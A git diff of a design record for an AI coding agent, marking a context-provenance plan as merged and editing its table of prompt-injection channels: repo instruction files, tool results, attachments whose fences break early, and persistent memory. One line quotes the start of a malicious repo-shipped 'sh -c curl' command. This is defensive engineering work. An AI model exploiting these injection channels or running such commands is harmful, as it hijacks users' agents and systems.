@@ -1,6 +1,11 @@
 # Context provenance
 
-Status: **Proposed** — design only; nothing on `main`.
+Status: **Resolved.** All four phases are on `main`: the instruction fence
+([#1827](https://github.com/copse-dev/agent-pane/pull/1827)), the trust gate and envelope
+([#1829](https://github.com/copse-dev/agent-pane/pull/1829)), the tool-result envelope
+([#1828](https://github.com/copse-dev/agent-pane/pull/1828)) and memory provenance
+([#1834](https://github.com/copse-dev/agent-pane/pull/1834)), with the injection steer-eval corpus in
+[#1837](https://github.com/copse-dev/agent-pane/pull/1837). The text below is the design record.
 
 Every byte of model context should carry an answer to "who wrote this?", and
 untrusted bytes should never be able to forge the container they arrive in.
@@ -28,12 +33,12 @@ descriptions as data, and wraps invoked workspace/plugin skill bodies in
 explicit anti-hijack guidance (`UNTRUSTED_SKILL_GUIDANCE`). Everything else
 ships attacker-controllable text into context with no marking at all:
 
-| Channel                                                                                                             | Today                                                                                                                                                             | Why it matters                                                                                                                                                                         |
-| ------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `AGENTS.md` / `AGENT.md` / `CLAUDE.md`, `.cursor/rules/*.mdc`, `.cursorrules`                                       | Concatenated raw as the **last** section of the system prompt (`agent-system-prompt.ts`), no delimiter beyond a `---`, no provenance, **no workspace-trust gate** | A cloned repo's instruction file gets system-prompt authority, positioned after every Copse-authored safety block, before the user has trusted anything                                |
-| Tool results (`fetch_url`, `web_search`, `parallel_search`, `gh_*` bodies, CI logs, MCP results, browser snapshots) | Bare text pushed into history at the single choke point in `run-agent-loop.ts` (`normalizeToolExecuteResult` → `messages.push({ role: 'tool', … })`)              | The classic indirect-injection channel; the model cannot discount what it cannot distinguish                                                                                           |
-| Inlined attachments (`@`-file mentions, paste chips)                                                                | `renderTextBlock` wraps content in a plain ` ` ``` fence with no escaping                                                                                         | Any file containing a triple-backtick fence — most markdown — closes the container early and the rest reads as user-authored message text. A bug independent of the injection argument |
-| `remember` / `recall` (OKF memories)                                                                                | Memory body persisted verbatim, replayed into future threads                                                                                                      | Upgrades a one-turn injection into a durable one                                                                                                                                       |
+| Channel                                                                                          | Today                                                                                                                                                             | Why it matters                                                                                                                                                                         |
+| ------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `AGENTS.md` / `AGENT.md` / `CLAUDE.md`, `.cursor/rules/*.mdc`, `.cursorrules`                    | Concatenated raw as the **last** section of the system prompt (`agent-system-prompt.ts`), no delimiter beyond a `---`, no provenance, **no workspace-trust gate** | A cloned repo's instruction file gets system-prompt authority, positioned after every Copse-authored safety block, before the user has trusted anything                                |
+| Tool results (`fetch_url`, `web_search`, `gh_*` bodies, CI logs, MCP results, browser snapshots) | Bare text pushed into history at the single choke point in `run-agent-loop.ts` (`normalizeToolExecuteResult` → `messages.push({ role: 'tool', … })`)              | The classic indirect-injection channel; the model cannot discount what it cannot distinguish                                                                                           |
+| Inlined attachments (`@`-file mentions, paste chips)                                             | `renderTextBlock` wraps content in a plain ` ` ``` fence with no escaping                                                                                         | Any file containing a triple-backtick fence — most markdown — closes the container early and the rest reads as user-authored message text. A bug independent of the injection argument |
+| `remember` / `recall` (OKF memories)                                                             | Memory body persisted verbatim, replayed into future threads                                                                                                      | Upgrades a one-turn injection into a durable one                                                                                                                                       |
 
 The inconsistency is sharpest at the first row. `workspace-trust.ts` exists
 precisely because "a cloned repo can ship `{"command":"sh","args":["-c","curl
@@ -130,7 +135,7 @@ provenance?: 'trusted' | 'workspace' | 'external'
   `git_*`, `explore` summaries). Untrusted per the threat model, but already
   the user's chosen working set; framed lightly.
 - `external` — bytes from beyond the workspace boundary: `fetch_url`,
-  `web_search`, `parallel_search`, all MCP tools (`mcp-registry.ts` sets it
+  `web_search`, all MCP tools (`mcp-registry.ts` sets it
   at registration), `gh_pr_view`/`gh_pr_list` bodies and comments,
   `get_ci_failure_logs`, browser snapshots/`browser_navigate`,
   `read_terminal` (in addition to its existing screen).
